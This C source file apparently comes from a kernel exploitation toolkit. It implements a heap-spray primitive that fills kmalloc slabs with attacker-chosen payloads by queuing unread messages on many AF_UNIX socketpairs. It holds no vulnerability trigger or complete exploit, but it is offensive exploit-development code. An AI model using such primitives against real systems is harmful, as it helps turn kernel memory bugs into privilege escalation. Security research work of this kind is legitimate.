/* skbspray.c — AF_UNIX skb sendmsg spray / kmalloc-slab reclaim primitive.
 * See skbspray.h for the technique and the SKB_DATA_DELTA note. */
#include "skbspray.h"

#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <unistd.h>

int lib_skb_spray_init(struct lib_skb_spray *s, size_t payload_len,
                       int nsockets, int per_socket)
{
	if (!s || nsockets <= 0 || per_socket <= 0 || payload_len == 0) {
		errno = EINVAL;
		return -1;
	}

	if (s->sock_type == 0)
		s->sock_type = SOCK_DGRAM;
	if (s->sndbuf == 0)
		s->sndbuf = LIB_SKB_DEFAULT_SNDBUF;
	s->payload_len = payload_len;
	s->nsockets = nsockets;
	s->per_socket = per_socket;

	s->sv = calloc((size_t)nsockets, sizeof(*s->sv));
	if (!s->sv)
		return -1;
	for (int i = 0; i < nsockets; i++) {
		s->sv[i][0] = s->sv[i][1] = -1;
	}

	for (int i = 0; i < nsockets; i++) {
		if (socketpair(AF_UNIX, s->sock_type, 0, s->sv[i]) < 0) {
			int e = errno;
			/* tear down what we built so far */
			for (int j = 0; j <= i; j++) {
				if (s->sv[j][0] >= 0) close(s->sv[j][0]);
				if (s->sv[j][1] >= 0) close(s->sv[j][1]);
			}
			free(s->sv);
			s->sv = NULL;
			errno = e;
			return -1;
		}
		/* Raise the send buffer so many unread sends can queue; a failure
		 * here is non-fatal (the spray just queues fewer). */
		setsockopt(s->sv[i][0], SOL_SOCKET, SO_SNDBUF,
		           &s->sndbuf, sizeof(s->sndbuf));
		setsockopt(s->sv[i][1], SOL_SOCKET, SO_RCVBUF,
		           &s->sndbuf, sizeof(s->sndbuf));
	}
	return 0;
}

int lib_skb_spray_fire(struct lib_skb_spray *s, const void *payload)
{
	if (!s || !s->sv)
		return -1;

	struct iovec iov;
	struct msghdr msg;
	memset(&iov, 0, sizeof(iov));
	memset(&msg, 0, sizeof(msg));
	iov.iov_base = (void *)payload;
	iov.iov_len = s->payload_len;
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;

	int sent = 0;
	for (int i = 0; i < s->nsockets; i++) {
		for (int j = 0; j < s->per_socket; j++) {
			ssize_t n = sendmsg(s->sv[i][0], &msg, MSG_DONTWAIT);
			if (n < 0)
				break; /* this socket's queue is full; next socket */
			sent++;
		}
	}
	return sent;
}

void lib_skb_spray_free(struct lib_skb_spray *s)
{
	if (!s || !s->sv)
		return;
	for (int i = 0; i < s->nsockets; i++) {
		if (s->sv[i][0] >= 0) close(s->sv[i][0]);
		if (s->sv[i][1] >= 0) close(s->sv[i][1]);
	}
	free(s->sv);
	s->sv = NULL;
	s->nsockets = 0;
}
